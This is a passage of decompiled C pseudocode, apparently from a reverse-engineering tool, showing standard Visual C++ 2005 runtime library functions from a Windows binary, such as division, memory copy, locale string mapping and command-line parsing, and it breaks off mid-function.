undefined8 __aulldvrm(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  
  uVar3 = param_1;
  uVar8 = param_4;
  uVar6 = param_2;
  uVar9 = param_3;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar5 = uVar8 >> 1;
      uVar9 = uVar9 >> 1 | (uint)((uVar8 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar8 = uVar5;
      uVar6 = uVar7;
    } while (uVar5 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar9;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar8 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar8)) ||
       ((param_2 <= uVar8 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  return CONCAT44(uVar3,iVar4);
}



// Library Function - Single Match
//  _write_char
// 
// Library: Visual Studio 2005 Release

void __fastcall _write_char(FILE *param_1)

{
  int *piVar1;
  byte in_AL;
  uint uVar2;
  int *unaff_ESI;
  
  if (((*(byte *)&param_1->_flag & 0x40) == 0) || (param_1->_base != (char *)0x0)) {
    piVar1 = &param_1->_cnt;
    *piVar1 = *piVar1 + -1;
    if (*piVar1 < 0) {
      uVar2 = __flsbuf((int)(char)in_AL,param_1);
    }
    else {
      *param_1->_ptr = in_AL;
      param_1->_ptr = param_1->_ptr + 1;
      uVar2 = (uint)in_AL;
    }
    if (uVar2 == 0xffffffff) {
      *unaff_ESI = -1;
      return;
    }
  }
  *unaff_ESI = *unaff_ESI + 1;
  return;
}



// Library Function - Single Match
//  _write_multi_char
// 
// Libraries: Visual Studio 2003 Release, Visual Studio 2005 Release, Visual Studio 2008 Release,
// Visual Studio 2010 Release

void __cdecl _write_multi_char(undefined4 param_1,int param_2,FILE *param_3)

{
  int *in_EAX;
  
  do {
    if (param_2 < 1) {
      return;
    }
    param_2 = param_2 + -1;
    _write_char(param_3);
  } while (*in_EAX != -1);
  return;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __crtLCMapStringW_stat(struct localeinfo_struct *,unsigned long,unsigned
// long,wchar_t const *,int,wchar_t *,int,int)
// 
// Library: Visual Studio 2005 Release

int __cdecl
__crtLCMapStringW_stat
          (localeinfo_struct *param_1,ulong param_2,ulong param_3,wchar_t *param_4,int param_5,
          wchar_t *param_6,int param_7,int param_8)

{
  uint uVar1;
  int iVar2;
  DWORD DVar3;
  short *psVar4;
  uint cbMultiByte;
  undefined4 *puVar5;
  rsize_t _MaxCount;
  undefined4 *puVar6;
  errno_t eVar7;
  int *in_ECX;
  wchar_t *pwVar8;
  undefined4 *local_c;
  
  uVar1 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  if (DAT_0042425c == 0) {
    iVar2 = LCMapStringW(0,0x100,(LPCWSTR)&DAT_0041cae4,1,(LPWSTR)0x0,0);
    if (iVar2 == 0) {
      DVar3 = GetLastError();
      if (DVar3 == 0x78) {
        DAT_0042425c = 2;
      }
    }
    else {
      DAT_0042425c = 1;
    }
  }
  psVar4 = (short *)param_3;
  pwVar8 = param_4;
  if (0 < (int)param_4) {
    do {
      pwVar8 = (wchar_t *)((int)pwVar8 + -1);
      if (*psVar4 == 0) goto LAB_00412e0b;
      psVar4 = psVar4 + 1;
    } while (pwVar8 != (wchar_t *)0x0);
    pwVar8 = (wchar_t *)0xffffffff;
LAB_00412e0b:
    param_4 = (wchar_t *)((int)param_4 + (-1 - (int)pwVar8));
  }
  if (DAT_0042425c == 1) {
    LCMapStringW((LCID)param_1,param_2,(LPCWSTR)param_3,(int)param_4,(LPWSTR)param_5,(int)param_6);
    goto LAB_00412fe5;
  }
  if ((DAT_0042425c != 2) && (DAT_0042425c != 0)) goto LAB_00412fe5;
  if (param_1 == (localeinfo_struct *)0x0) {
    param_1 = *(localeinfo_struct **)(*in_ECX + 0x14);
  }
  if (param_7 == 0) {
    param_7 = *(int *)(*in_ECX + 4);
  }
  iVar2 = ___ansicp((LCID)param_1);
  if ((param_7 != iVar2) && (iVar2 != -1)) {
    param_7 = iVar2;
  }
  cbMultiByte = WideCharToMultiByte(param_7,0,(LPCWSTR)param_3,(int)param_4,(LPSTR)0x0,0,(LPCSTR)0x0
                                    ,(LPBOOL)0x0);
  if (cbMultiByte == 0) goto LAB_00412fe5;
  if (((int)cbMultiByte < 1) || (0xffffffe0 / cbMultiByte == 0)) {
    local_c = (undefined4 *)0x0;
  }
  else if (cbMultiByte + 8 < 0x401) {
    puVar5 = (undefined4 *)&stack0xffffffe0;
    local_c = (undefined4 *)&stack0xffffffe0;
    if (&stack0x00000000 != (undefined *)0x20) {
LAB_00412ed4:
      local_c = puVar5 + 2;
    }
  }
  else {
    puVar5 = (undefined4 *)_malloc(cbMultiByte + 8);
    local_c = puVar5;
    if (puVar5 != (undefined4 *)0x0) {
      *puVar5 = 0xdddd;
      goto LAB_00412ed4;
    }
  }
  if (local_c == (undefined4 *)0x0) goto LAB_00412fe5;
  iVar2 = WideCharToMultiByte(param_7,0,(LPCWSTR)param_3,(int)param_4,(LPSTR)local_c,cbMultiByte,
                              (LPCSTR)0x0,(LPBOOL)0x0);
  if ((iVar2 != 0) &&
     (_MaxCount = LCMapStringA((LCID)param_1,param_2,(LPCSTR)local_c,cbMultiByte,(LPSTR)0x0,0),
     _MaxCount != 0)) {
    puVar5 = (undefined4 *)0x0;
    if ((0 < (int)_MaxCount) && (0xffffffe0 / _MaxCount != 0)) {
      if (_MaxCount + 8 < 0x401) {
        puVar6 = (undefined4 *)&stack0xffffffe0;
        puVar5 = (undefined4 *)&stack0xffffffe0;
        if (&stack0x00000000 != (undefined *)0x20) {
LAB_00412f58:
          puVar5 = puVar6 + 2;
        }
      }
      else {
        puVar6 = (undefined4 *)_malloc(_MaxCount + 8);
        puVar5 = puVar6;
        if (puVar6 != (undefined4 *)0x0) {
          *puVar6 = 0xdddd;
          goto LAB_00412f58;
        }
      }
    }
    if (puVar5 != (undefined4 *)0x0) {
      iVar2 = LCMapStringA((LCID)param_1,param_2,(LPCSTR)local_c,cbMultiByte,(LPSTR)puVar5,_MaxCount
                          );
      if (iVar2 != 0) {
        if ((param_2 & 0x400) == 0) {
          if (param_6 == (wchar_t *)0x0) {
            param_6 = (wchar_t *)0x0;
            param_5 = 0;
          }
          MultiByteToWideChar(param_7,1,(LPCSTR)puVar5,_MaxCount,(LPWSTR)param_5,(int)param_6);
        }
        else if (param_6 != (wchar_t *)0x0) {
          if ((int)param_6 <= (int)_MaxCount) {
            _MaxCount = (int)param_6 - 1;
          }
          eVar7 = _strncpy_s((char *)param_5,(rsize_t)param_6,(char *)puVar5,_MaxCount);
          if (eVar7 != 0) {
                    // WARNING: Subroutine does not return
            __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
          }
        }
      }
      __freea(puVar5);
    }
  }
  __freea(local_c);
LAB_00412fe5:
  iVar2 = ___security_check_cookie_4(uVar1 ^ (uint)&stack0xfffffffc);
  return iVar2;
}



// Library Function - Single Match
//  ___crtLCMapStringW
// 
// Library: Visual Studio 2005 Release

int __cdecl
___crtLCMapStringW(LPCWSTR _LocaleName,DWORD _DWMapFlag,LPCWSTR _LpSrcStr,int _CchSrc,
                  LPWSTR _LpDestStr,int _CchDest)

{
  int iVar1;
  wchar_t *in_stack_0000001c;
  int in_stack_00000020;
  int in_stack_ffffffec;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&stack0xffffffec,(localeinfo_struct *)_LocaleName);
  iVar1 = __crtLCMapStringW_stat
                    ((localeinfo_struct *)_DWMapFlag,(ulong)_LpSrcStr,_CchSrc,_LpDestStr,_CchDest,
                     in_stack_0000001c,in_stack_00000020,in_stack_ffffffec);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// WARNING: This is an inlined function
// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  __alloca_probe_16
// 
// Library: Visual Studio 2005 Release

uint __alloca_probe_16(undefined1 param_1)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 0xf;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



// WARNING: This is an inlined function
// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  __alloca_probe_8
// 
// Library: Visual Studio

uint __alloca_probe_8(undefined1 param_1)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 7;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



// Library Function - Single Match
//  __towlower_l
// 
// Library: Visual Studio 2005 Release

wint_t __cdecl __towlower_l(wint_t _C,_locale_t _Locale)

{
  wchar_t *_DWMapFlag;
  wint_t wVar1;
  int iVar2;
  undefined2 in_stack_00000006;
  localeinfo_struct local_18;
  int local_10;
  char local_c;
  ushort local_8 [2];
  
  wVar1 = 0xffff;
  if (_C != 0xffff) {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_18,_Locale);
    _DWMapFlag = (local_18.locinfo)->lc_category[0].wlocale;
    if (_DWMapFlag == (wchar_t *)0x0) {
      wVar1 = _C;
      if ((ushort)(_C - 0x41) < 0x1a) {
        wVar1 = _C + 0x20;
      }
    }
    else if (_C < 0x100) {
      iVar2 = __iswctype_l(_C,1,&local_18);
      wVar1 = _C;
      if (iVar2 != 0) {
        wVar1 = (wint_t)*(byte *)((int)local_18.locinfo[1].lc_category[0].wlocale + (__C & 0xffff));
      }
    }
    else {
      iVar2 = ___crtLCMapStringW((LPCWSTR)&local_18,(DWORD)_DWMapFlag,(LPCWSTR)0x100,(int)&_C,
                                 (LPWSTR)0x1,(int)local_8);
      wVar1 = _C;
      if (iVar2 != 0) {
        wVar1 = local_8[0];
      }
    }
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
  }
  return wVar1;
}



// Library Function - Single Match
//  _fastcopy_I
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2019

void __cdecl _fastcopy_I(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  undefined4 uVar10;
  undefined4 uVar11;
  undefined4 uVar12;
  undefined4 uVar13;
  undefined4 uVar14;
  undefined4 uVar15;
  uint uVar16;
  
  uVar16 = param_3 >> 7;
  do {
    uVar1 = param_2[1];
    uVar2 = param_2[2];
    uVar3 = param_2[3];
    uVar4 = param_2[4];
    uVar5 = param_2[5];
    uVar6 = param_2[6];
    uVar7 = param_2[7];
    uVar8 = param_2[8];
    uVar9 = param_2[9];
    uVar10 = param_2[10];
    uVar11 = param_2[0xb];
    uVar12 = param_2[0xc];
    uVar13 = param_2[0xd];
    uVar14 = param_2[0xe];
    uVar15 = param_2[0xf];
    *param_1 = *param_2;
    param_1[1] = uVar1;
    param_1[2] = uVar2;
    param_1[3] = uVar3;
    param_1[4] = uVar4;
    param_1[5] = uVar5;
    param_1[6] = uVar6;
    param_1[7] = uVar7;
    param_1[8] = uVar8;
    param_1[9] = uVar9;
    param_1[10] = uVar10;
    param_1[0xb] = uVar11;
    param_1[0xc] = uVar12;
    param_1[0xd] = uVar13;
    param_1[0xe] = uVar14;
    param_1[0xf] = uVar15;
    uVar1 = param_2[0x11];
    uVar2 = param_2[0x12];
    uVar3 = param_2[0x13];
    uVar4 = param_2[0x14];
    uVar5 = param_2[0x15];
    uVar6 = param_2[0x16];
    uVar7 = param_2[0x17];
    uVar8 = param_2[0x18];
    uVar9 = param_2[0x19];
    uVar10 = param_2[0x1a];
    uVar11 = param_2[0x1b];
    uVar12 = param_2[0x1c];
    uVar13 = param_2[0x1d];
    uVar14 = param_2[0x1e];
    uVar15 = param_2[0x1f];
    param_1[0x10] = param_2[0x10];
    param_1[0x11] = uVar1;
    param_1[0x12] = uVar2;
    param_1[0x13] = uVar3;
    param_1[0x14] = uVar4;
    param_1[0x15] = uVar5;
    param_1[0x16] = uVar6;
    param_1[0x17] = uVar7;
    param_1[0x18] = uVar8;
    param_1[0x19] = uVar9;
    param_1[0x1a] = uVar10;
    param_1[0x1b] = uVar11;
    param_1[0x1c] = uVar12;
    param_1[0x1d] = uVar13;
    param_1[0x1e] = uVar14;
    param_1[0x1f] = uVar15;
    param_2 = param_2 + 0x20;
    param_1 = param_1 + 0x20;
    uVar16 = uVar16 - 1;
  } while (uVar16 != 0);
  return;
}



// Library Function - Single Match
//  __VEC_memcpy
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

undefined4 * __cdecl __VEC_memcpy(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  undefined *puVar5;
  undefined4 *puVar6;
  undefined *puVar7;
  undefined4 *puVar8;
  
  uVar3 = (int)param_2 >> 0x1f;
  uVar3 = (((uint)param_2 ^ uVar3) - uVar3 & 0xf ^ uVar3) - uVar3;
  uVar4 = (int)param_1 >> 0x1f;
  uVar4 = (((uint)param_1 ^ uVar4) - uVar4 & 0xf ^ uVar4) - uVar4;
  if ((uVar3 | uVar4) == 0) {
    uVar3 = param_3 & 0x7f;
    if (param_3 != uVar3) {
      _fastcopy_I(param_1,param_2,param_3 - uVar3);
    }
    if (uVar3 != 0) {
      puVar5 = (undefined *)((int)param_2 + (param_3 - uVar3));
      puVar7 = (undefined *)((int)param_1 + (param_3 - uVar3));
      for (; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar7 = *puVar5;
        puVar5 = puVar5 + 1;
        puVar7 = puVar7 + 1;
      }
    }
  }
  else if (uVar3 == uVar4) {
    iVar1 = 0x10 - uVar3;
    puVar6 = param_2;
    puVar8 = param_1;
    for (iVar2 = iVar1; iVar2 != 0; iVar2 = iVar2 + -1) {
      *(undefined *)puVar8 = *(undefined *)puVar6;
      puVar6 = (undefined4 *)((int)puVar6 + 1);
      puVar8 = (undefined4 *)((int)puVar8 + 1);
    }
    __VEC_memcpy((undefined4 *)((int)param_1 + iVar1),(undefined4 *)((int)param_2 + iVar1),
                 param_3 - iVar1);
  }
  else {
    puVar6 = param_1;
    for (uVar3 = param_3 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
      *puVar6 = *param_2;
      param_2 = param_2 + 1;
      puVar6 = puVar6 + 1;
    }
    for (uVar3 = param_3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
      *(undefined *)puVar6 = *(undefined *)param_2;
      param_2 = (undefined4 *)((int)param_2 + 1);
      puVar6 = (undefined4 *)((int)puVar6 + 1);
    }
  }
  return param_1;
}



void FUN_00413297(void)

{
  return;
}



// Library Function - Single Match
//  __XcptFilter
// 
// Library: Visual Studio 2005 Release

int __cdecl __XcptFilter(ulong _ExceptionNum,_EXCEPTION_POINTERS *_ExceptionPtr)

{
  ulong *puVar1;
  code *pcVar2;
  void *pvVar3;
  ulong uVar4;
  _ptiddata p_Var5;
  int iVar6;
  ulong *puVar7;
  int iVar8;
  
  p_Var5 = __getptd_noexit();
  if (p_Var5 == (_ptiddata)0x0) {
    iVar6 = UnhandledExceptionFilter(_ExceptionPtr);
  }
  else {
    puVar1 = (ulong *)p_Var5->_pxcptacttab;
    puVar7 = puVar1;
    do {
      if (*puVar7 == _ExceptionNum) break;
      puVar7 = puVar7 + 3;
    } while (puVar7 < puVar1 + DAT_00422e24 * 3);
    if ((puVar1 + DAT_00422e24 * 3 <= puVar7) || (*puVar7 != _ExceptionNum)) {
      puVar7 = (ulong *)0x0;
    }
    if ((puVar7 == (ulong *)0x0) || (pcVar2 = (code *)puVar7[2], pcVar2 == (code *)0x0)) {
      iVar6 = UnhandledExceptionFilter(_ExceptionPtr);
    }
    else if (pcVar2 == (code *)0x5) {
      puVar7[2] = 0;
      iVar6 = 1;
    }
    else {
      if (pcVar2 != (code *)0x1) {
        pvVar3 = p_Var5->_tpxcptinfoptrs;
        p_Var5->_tpxcptinfoptrs = _ExceptionPtr;
        if (puVar7[1] == 8) {
          if (DAT_00422e18 < DAT_00422e1c + DAT_00422e18) {
            iVar8 = DAT_00422e18 * 0xc;
            iVar6 = DAT_00422e18;
            do {
              *(undefined4 *)(iVar8 + 8 + (int)p_Var5->_pxcptacttab) = 0;
              iVar6 = iVar6 + 1;
              iVar8 = iVar8 + 0xc;
            } while (iVar6 < DAT_00422e1c + DAT_00422e18);
          }
          uVar4 = *puVar7;
          iVar6 = p_Var5->_tfpecode;
          if (uVar4 == 0xc000008e) {
            p_Var5->_tfpecode = 0x83;
          }
          else if (uVar4 == 0xc0000090) {
            p_Var5->_tfpecode = 0x81;
          }
          else if (uVar4 == 0xc0000091) {
            p_Var5->_tfpecode = 0x84;
          }
          else if (uVar4 == 0xc0000093) {
            p_Var5->_tfpecode = 0x85;
          }
          else if (uVar4 == 0xc000008d) {
            p_Var5->_tfpecode = 0x82;
          }
          else if (uVar4 == 0xc000008f) {
            p_Var5->_tfpecode = 0x86;
          }
          else if (uVar4 == 0xc0000092) {
            p_Var5->_tfpecode = 0x8a;
          }
          (*pcVar2)(8,p_Var5->_tfpecode);
          p_Var5->_tfpecode = iVar6;
        }
        else {
          puVar7[2] = 0;
          (*pcVar2)(puVar7[1]);
        }
        p_Var5->_tpxcptinfoptrs = pvVar3;
      }
      iVar6 = -1;
    }
  }
  return iVar6;
}



// Library Function - Single Match
//  __wwincmdln
// 
// Library: Visual Studio 2005 Release

void __wwincmdln(void)

{
  ushort uVar1;
  bool bVar2;
  ushort *puVar3;
  
  bVar2 = false;
  puVar3 = DAT_00426944;
  if (DAT_00426944 == (ushort *)0x0) {
    puVar3 = &DAT_0041ddcc;
  }
  do {
    uVar1 = *puVar3;
    if (uVar1 < 0x21) {
      if (uVar1 == 0) {
        return;
      }
      if (!bVar2) {
        for (; (*puVar3 != 0 && (*puVar3 < 0x21)); puVar3 = puVar3 + 1) {
        }
        return;
      }
    }
    if (uVar1 == 0x22) {
      bVar2 = !bVar2;
    }
    puVar3 = puVar3 + 1;
  } while( true );
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wsetenvp
// 
// Library: Visual Studio 2005 Release

int __cdecl __wsetenvp(void)

{
  int iVar1;
  wchar_t **ppwVar2;
  wchar_t *_Dst;
  errno_t eVar3;
  wchar_t *pwVar4;
  int iVar5;
  size_t _Count;
  
  iVar5 = 0;
  pwVar4 = DAT_00423a14;
  if (DAT_00423a14 == (wchar_t *)0x0) {
    iVar5 = -1;
  }
  else {
    for (; *pwVar4 != L'\0'; pwVar4 = pwVar4 + iVar1 + 1) {
      if (*pwVar4 != L'=') {
        iVar5 = iVar5 + 1;
      }
      iVar1 = FUN_00416bc8(pwVar4);
    }
    ppwVar2 = (wchar_t **)__calloc_crt(iVar5 + 1,4);
    pwVar4 = DAT_00423a14;
    DAT_00423ee4 = ppwVar2;
    if (ppwVar2 == (wchar_t **)0x0) {
      iVar5 = -1;
    }
    else {
      for (; *pwVar4 != L'\0'; pwVar4 = pwVar4 + _Count) {
        iVar5 = FUN_00416bc8(pwVar4);
        _Count = iVar5 + 1;
        if (*pwVar4 != L'=') {
          _Dst = (wchar_t *)__calloc_crt(_Count,2);
          *ppwVar2 = _Dst;
          if (_Dst == (wchar_t *)0x0) {
            _free(DAT_00423ee4);
            DAT_00423ee4 = (wchar_t **)0x0;
            return -1;
          }
          eVar3 = _wcscpy_s(_Dst,_Count,pwVar4);
          if (eVar3 != 0) {
                    // WARNING: Subroutine does not return
            __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
          }
          ppwVar2 = ppwVar2 + 1;
        }
      }
      _free(DAT_00423a14);
      DAT_00423a14 = (wchar_t *)0x0;
      *ppwVar2 = (wchar_t *)0x0;
      _DAT_004257e8 = 1;
      iVar5 = 0;
    }
  }
  return iVar5;
}



// Library Function - Single Match
//  _wparse_cmdline
// 
// Library: Visual Studio 2005 Release

void __thiscall _wparse_cmdline(void *this,short **param_1,int *param_2)

{
  bool bVar1;
  bool bVar2;
  short *in_EAX;
  short *psVar3;
  short sVar4;
  uint uVar5;
  int *unaff_EBX;
  
  bVar1 = false;
  *unaff_EBX = 0;
  *param_2 = 1;
  if (param_1 != (short **)0x0) {
    *param_1 = (short *)this;
    param_1 = param_1 + 1;
  }
  do {
    if (*in_EAX == 0x22) {
      bVar1 = !bVar1;
      sVar4 = 0x22;
    }
    else {
      *unaff_EBX = *unaff_EBX + 1;
      if ((short *)this != (short *)0x0) {
        *(short *)this = *in_EAX;
        this = (void *)((int)this + 2);
      }
      sVar4 = *in_EAX;
      if (sVar4 == 0) goto LAB_00413594;
    }
    in_EAX = in_EAX + 1;
  } while ((bVar1) || ((sVar4 != 0x20 && (sVar4 != 9))));
  if ((short *)this != (short *)0x0) {
    *(short *)((int)this + -2) = 0;
  }
LAB_00413594:
  bVar1 = false;
  while (psVar3 = in_EAX, *in_EAX != 0) {
    for (; (*psVar3 == 0x20 || (*psVar3 == 9)); psVar3 = psVar3 + 1) {
    }
    if (*psVar3 == 0) break;
    if (param_1 != (short **)0x0) {
      *param_1 = (short *)this;
      param_1 = param_1 + 1;
    }
    *param_2 = *param_2 + 1;
    while( true ) {
      bVar2 = true;
      uVar5 = 0;
      for (; *psVar3 == 0x5c; psVar3 = psVar3 + 1) {
        uVar5 = uVar5 + 1;
      }
      in_EAX = psVar3;
      if (*psVar3 == 0x22) {
        if (((uVar5 & 1) == 0) && ((!bVar1 || (in_EAX = psVar3 + 1, *in_EAX != 0x22)))) {
          bVar2 = false;
          bVar1 = !bVar1;
          in_EAX = psVar3;
        }
        uVar5 = uVar5 >> 1;
      }
      while (uVar5 != 0) {
        uVar5 = uVar5 - 1;
        if ((short *)this != (short *)0x0) {
          *(short *)this = 0x5c;
          this = (void *)((int)this + 2);
        }
        *unaff_EBX = *unaff_EBX + 1;
      }
      sVar4 = *in_EAX;
      if ((sVar4 == 0) || ((!bVar1 && ((sVar4 == 0x20 || (sVar4 == 9)))))) break;
      if (bVar2) {
        if ((short *)this != (short *)0x0) {
          *(short *)this = sVar4;
          this = (void *)((int)this + 2);
        }
        *unaff_EBX = *unaff_EBX + 1;
      }
      psVar3 = in_EAX + 1;
    }
    if ((short *)this != (short *)0x0) {
      *(short *)this = 0;
      this = (void *)((int)this + 2);
    }
    *unaff_EBX = *unaff_EBX + 1;
  }
  if (param_1 != (short **)0x0) {
    *param_1 = (short *)0x0;
  }
  *param_2 = *param_2 + 1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wsetargv
// 
// Library: Visual Studio 2005 Release

int __cdecl __wsetargv(void)

{
  uint _Size;
  uint uVar1;
  short **ppsVar2;
  int iVar3;
  uint in_ECX;
  uint local_8;
  
  _DAT_00424468 = 0;
  local_8 = in_ECX;
  GetModuleFileNameW((HMODULE)0x0,(LPWSTR)&DAT_00424260,0x104);
  _DAT_00423ef0 = &DAT_00424260;
  _wparse_cmdline((void *)0x0,(short **)0x0,(int *)&local_8);
  uVar1 = local_8;
  if ((((local_8 < 0x3fffffff) && (in_ECX < 0x7fffffff)) &&
      (_Size = (in_ECX + local_8 * 2) * 2, in_ECX * 2 <= _Size)) &&
     (ppsVar2 = (short **)__malloc_crt(_Size), ppsVar2 != (short **)0x0)) {
    _wparse_cmdline(ppsVar2 + uVar1,ppsVar2,(int *)&local_8);
    _DAT_00423ed0 = local_8 - 1;
    iVar3 = 0;
    _DAT_00423ed8 = ppsVar2;
  }
  else {
    iVar3 = -1;
  }
  return iVar3;
}



// Library Function - Single Match
//  ___crtGetEnvironmentStringsW
// 
// Library: Visual Studio 2005 Release

LPVOID __cdecl ___crtGetEnvironmentStringsW(void)

{
  char *pcVar1;
  char cVar2;
  WCHAR WVar3;
  LPWSTR lpWideCharStr;
  DWORD DVar4;
  WCHAR *pWVar5;
  WCHAR *pWVar6;
  size_t sVar7;
  void *_Dst;
  LPCH pCVar8;
  int iVar9;
  LPWSTR _Memory;
  LPWCH _Src;
  int iVar10;
  
  iVar10 = 0;
  _Src = (LPWCH)0x0;
  if (DAT_0042446c == 0) {
    _Src = GetEnvironmentStringsW();
    if (_Src != (LPWCH)0x0) {
      DAT_0042446c = 1;
      goto LAB_00413769;
    }
    DVar4 = GetLastError();
    if (DVar4 == 0x78) {
      DAT_0042446c = 2;
    }
  }
  if (DAT_0042446c != 1) {
    if ((DAT_0042446c != 2) && (DAT_0042446c != 0)) {
      return (LPVOID)0x0;
    }
    pCVar8 = GetEnvironmentStrings();
    if (pCVar8 == (LPCH)0x0) {
      return (LPVOID)0x0;
    }
    cVar2 = *pCVar8;
    pcVar1 = pCVar8;
    while (cVar2 != '\0') {
      iVar9 = MultiByteToWideChar(0,1,pcVar1,-1,(LPWSTR)0x0,0);
      if (iVar9 == 0) {
        return (LPVOID)0x0;
      }
      iVar10 = iVar10 + iVar9;
      sVar7 = _strlen(pcVar1);
      pcVar1 = pcVar1 + sVar7 + 1;
      cVar2 = *pcVar1;
    }
    _Memory = (LPWSTR)__calloc_crt(iVar10 + 1U,2);
    if (_Memory != (LPWSTR)0x0) {
      cVar2 = *pCVar8;
      lpWideCharStr = _Memory;
      pcVar1 = pCVar8;
      while( true ) {
        if (cVar2 == '\0') {
          *lpWideCharStr = L'\0';
          FreeEnvironmentStringsA(pCVar8);
          return _Memory;
        }
        iVar9 = MultiByteToWideChar(0,1,pcVar1,-1,lpWideCharStr,
                                    (iVar10 + 1U) - ((int)lpWideCharStr - (int)_Memory >> 1));
        if (iVar9 == 0) break;
        sVar7 = _strlen(pcVar1);
        pcVar1 = pcVar1 + sVar7 + 1;
        iVar9 = FUN_00416bc8(lpWideCharStr);
        cVar2 = *pcVar1;
        lpWideCharStr = lpWideCharStr + iVar9 + 1;
      }
      _free(_Memory);
    }
    FreeEnvironmentStringsA(pCVar8);
    return (LPVOID)0x0;
  }
LAB_00413769:
  if ((_Src == (LPWCH)0x0) && (_Src = GetEnvironmentStringsW(), _Src == (LPWCH)0x0)) {
    return (LPVOID)0x0;
  }
  WVar3 = *_Src;
  pWVar6 = _Src;
  while (WVar3 != L'\0') {
    do {
      pWVar5 = pWVar6;
      pWVar6 = pWVar5 + 1;
    } while (*pWVar6 != L'\0');
    pWVar6 = pWVar5 + 2;
    WVar3 = *pWVar6;
  }
  sVar7 = (int)pWVar6 + (2 - (int)_Src);
  _Dst = __malloc_crt(sVar7);
  if (_Dst != (void *)0x0) {
    _memcpy(_Dst,_Src,sVar7);
  }
  FreeEnvironmentStringsW(_Src);
  return _Dst;
}



// Library Function - Single Match
//  ___crtGetCommandLineW
// 
// Library: Visual Studio 2005 Release

LPWSTR ___crtGetCommandLineW(void)

{
  LPWSTR pWVar1;
  DWORD DVar2;
  LPSTR lpMultiByteStr;
  size_t _Count;
  int iVar3;
  
  if (DAT_00424470 == 0) {
    pWVar1 = GetCommandLineW();
    if (pWVar1 == (LPWSTR)0x0) {
      DVar2 = GetLastError();
      if (DVar2 != 0x78) {
        return (LPWSTR)0x0;
      }
      DAT_00424470 = 2;
LAB_004138cd:
      lpMultiByteStr = GetCommandLineA();
      _Count = MultiByteToWideChar(0,1,lpMultiByteStr,-1,(LPWSTR)0x0,0);
      if ((_Count != 0) && (pWVar1 = (LPWSTR)__calloc_crt(_Count,2), pWVar1 != (LPWSTR)0x0)) {
        iVar3 = MultiByteToWideChar(0,1,lpMultiByteStr,-1,pWVar1,_Count);
        if (iVar3 != 0) {
          return pWVar1;
        }
        _free(pWVar1);
      }
      return (LPWSTR)0x0;
    }
    DAT_00424470 = 1;
  }
  else if (DAT_00424470 != 1) {
    if (DAT_00424470 != 2) {
      return (LPWSTR)0x0;
    }
    goto LAB_004138cd;
  }
  pWVar1 = GetCommandLineW();
  return pWVar1;
}



// WARNING: Removing unreachable block (ram,0x00413930)
// WARNING: Removing unreachable block (ram,0x00413936)
// WARNING: Removing unreachable block (ram,0x00413938)
// Library Function - Single Match
//  __RTC_Initialize
// 
// Library: Visual Studio 2005 Release

void __RTC_Initialize(void)

{
  return;
}



// Library Function - Single Match
//  ___security_init_cookie
// 
// Library: Visual Studio 2005 Release

void __cdecl ___security_init_cookie(void)

{
  DWORD DVar1;
  DWORD DVar2;
  DWORD DVar3;
  uint uVar4;
  LARGE_INTEGER local_14;
  _FILETIME local_c;
  
  local_c.dwLowDateTime = 0;
  local_c.dwHighDateTime = 0;
  if ((DAT_00422044 == 0xbb40e64e) || ((DAT_00422044 & 0xffff0000) == 0)) {
    GetSystemTimeAsFileTime(&local_c);
    uVar4 = local_c.dwHighDateTime ^ local_c.dwLowDateTime;
    DVar1 = GetCurrentProcessId();
    DVar2 = GetCurrentThreadId();
    DVar3 = GetTickCount();
